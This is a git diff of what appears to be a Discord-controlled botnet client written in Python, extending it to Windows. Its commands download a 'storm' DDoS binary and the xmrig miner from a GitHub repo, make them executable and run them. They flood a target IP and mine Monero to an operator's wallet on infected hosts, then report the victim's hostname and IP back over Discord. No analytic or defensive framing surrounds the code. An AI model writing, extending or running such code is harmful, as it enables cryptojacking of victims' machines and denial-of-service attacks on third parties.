@@ -60,7 +60,7 @@ async def check(ctx):
     
 # update
 @bot.command()
-async def update(ctx, arg1):
+async def update(ctx):
     if platform.system() == 'Linux':
         os.chdir("/boot")
         if os.path.exists("Client"):
@@ -93,40 +93,56 @@ async def update(ctx, arg1):
 # ddos
 @bot.command()
 async def ddos(ctx, ddosarg):
-    if not os.path.exists("storm"):
-        url = "https://github.com/rxu7s/Public/raw/main/storm"
-        r = requests.get(url, allow_redirects=True)
-        open("storm", 'wb').write(r.content)
-        
-    ddosip = ''.join(ddosarg)
-    os.popen(f"chmod 777 storm; ./storm -d {ddosip}")
-    await ctx.send(f"``[+] {hostname}@{ip}: DDoS started to {ddosip}``")
+    if platform.system() == 'Linux':
+        if not os.path.exists("storm"):
+            url = "https://github.com/rxu7s/Public/raw/main/storm"
+            r = requests.get(url, allow_redirects=True)
+            open("storm", 'wb').write(r.content)
+            
+        ddosip = ''.join(ddosarg)
+        os.popen(f"chmod 777 storm; ./storm -d {ddosip}")
+        await ctx.send(f"``[+] {hostname}@{ip}: DDoS started to {ddosip}``")
     
 # stop ddos
 @bot.command()
 async def stopddos(ctx):
-    if "storm" in (i.name() for i in psutil.process_iter()):
-        os.popen("pkill storm")
-        await ctx.send(f"``[-] {hostname}@{ip}: DDoS stoped``")
+    if platform.system() == 'Linux':
+        if "storm" in (i.name() for i in psutil.process_iter()):
+            os.popen("pkill storm")
+            await ctx.send(f"``[-] {hostname}@{ip}: DDoS stoped``")
     
 # miner
 @bot.command()
 async def miner(ctx, walletArg):
-    if not os.path.exists("xmrig"):
-        url = "https://github.com/rxu7s/Public/raw/main/xmrig"
-        r = requests.get(url, allow_redirects=True)
-        open("xmrig", 'wb').write(r.content)
-    
     wallet = ''.join(walletArg)
-    os.popen(f"chmod 777 xmrig; ./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
-    await ctx.send(f"``[+] {hostname}@{ip}: Miner started``")
+    if platform.system() == 'Linux':
+        if not os.path.exists("xmrig"):
+            url = "https://github.com/rxu7s/Public/raw/main/xmrig"
+            r = requests.get(url, allow_redirects=True)
+            open("xmrig", 'wb').write(r.content)
+            
+        os.popen(f"chmod 777 xmrig; ./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
+        await ctx.send(f"``[+] {hostname}@{ip}: Miner started``")
+    else:
+        if not os.path.exists("xmrig.exe"):
+            url = "https://github.com/rxu7s/Public/raw/main/xmrig.exe"
+            r = requests.get(url, allow_redirects=True)
+            open("xmrig.exe", 'wb').write(r.content)
+            
+        os.popen(f"xmrig.exe --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Windows -k --tls")
+        await ctx.send(f"``[+] {hostname}@{ip}: Miner started``")
     
 # stop miner
 @bot.command()
 async def stopminer(ctx):
-    if "xmrig" in (i.name() for i in psutil.process_iter()):
-        os.popen("pkill xmrig")
-        await ctx.send(f"``[-] {hostname}@{ip}: Miner stoped``")
+    if platform.system() == 'Linux':
+        if "xmrig" in (i.name() for i in psutil.process_iter()):
+            os.popen("pkill xmrig")
+            await ctx.send(f"``[-] {hostname}@{ip}: Miner stoped``")
+    else:
+        if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
+            os.popen("taskkill /F /IM xmrig.exe /T")
+            await ctx.send(f"``[-] {hostname}@{ip}: Miner stoped``")
     
 
 # ----- Self Commands ----- #
@@ -137,7 +153,7 @@ async def ipinfo(ctx):
     link = "https://sheesh.rip/ip"
     f = requests.get(link)
     await ctx.send(f"""
-    ``[+] {hostname}@{ip}: IP Information``\n```IP:{f.headers['IP']}\nASN:{f.headers['ASN']}\nCountry:{f.headers['Country']}\nCity:{f.headers['City']}```
+    ``[+] {hostname}@{ip}: IP Information``\n```json\nIP:{f.headers['IP']}\nASN:{f.headers['ASN']}\nCountry:{f.headers['Country']}\nCity:{f.headers['City']}```
     """)
     
 # shell
